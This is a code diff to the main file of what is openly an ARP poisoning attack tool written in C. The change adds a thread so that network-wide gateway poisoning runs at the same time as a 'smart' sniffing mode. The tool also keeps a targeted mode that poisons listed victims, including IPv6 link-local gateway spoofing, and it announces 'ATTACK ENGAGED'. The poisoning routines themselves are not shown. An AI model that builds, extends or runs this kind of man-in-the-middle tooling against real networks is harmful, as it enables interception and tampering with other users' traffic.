@@ -5,6 +5,7 @@
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
+#include <pthread.h>
 #include "ARP/ARP_UTILS/arp_poison.h"
 #include "ARP/ARP_UTILS/arp_scan.h"
 #include "ARP/ARP_UTILS/utils_discovery.h"
@@ -16,6 +17,19 @@ unsigned char g_gateway_ip[4];
 unsigned char g_gateway_mac[6];
 unsigned char *g_gateway_ipv6_ll = NULL;
 unsigned char *g_mac_alloc = NULL;
+
+struct wide_thread_args {
+  unsigned char *gateway_ip;
+  unsigned char *gateway_mac;
+  unsigned char *gateway_ipv6_ll;
+};
+
+void *wide_poison_thread(void *arg) {
+  struct wide_thread_args *args = (struct wide_thread_args *)arg;
+  start_wide_poisoning(args->gateway_ip, args->gateway_mac, args->gateway_ipv6_ll);
+  return NULL;
+}
+
 void handle_sigint(int sig) {
   (void)sig; // suppress unused warning
   printf("\n[SHUTDOWN] Caught SIGINT. Commencing graceful shutdown...\n");
@@ -167,10 +181,22 @@ int main(int argc, char *argv[]) {
   printf("\n[*] >>> ATTACK ENGAGED : ARP poisoning Engine active! <<<\n");
   printf("[*] (Press Ctrl+C to cleanly heal the network and exit)\n\n");
 
-  if (wide_mode) {
-    start_wide_poisoning(g_gateway_ip, g_gateway_mac, g_gateway_ipv6_ll);
-  } else if (smart_mode) {
+  if (smart_mode) {
+    printf("[*] Concurrent execution: Wide mode thread + Smart Sniffer.\n");
+    pthread_t thread_id;
+    struct wide_thread_args *args = malloc(sizeof(struct wide_thread_args));
+    args->gateway_ip = g_gateway_ip;
+    args->gateway_mac = g_gateway_mac;
+    args->gateway_ipv6_ll = g_gateway_ipv6_ll;
+    
+    if (pthread_create(&thread_id, NULL, wide_poison_thread, args) != 0) {
+        perror("Failed to create wide poison thread");
+    }
+    
+    // Sniffer is a blocking, endless loop.
     start_smart_poisoning(g_gateway_ip, g_gateway_mac, g_gateway_ipv6_ll);
+  } else if (wide_mode) {
+    start_wide_poisoning(g_gateway_ip, g_gateway_mac, g_gateway_ipv6_ll);
   } else {
     start_poisoning(g_victims, g_victim_count, g_gateway_ip, g_gateway_mac, g_gateway_ipv6_ll);
   }
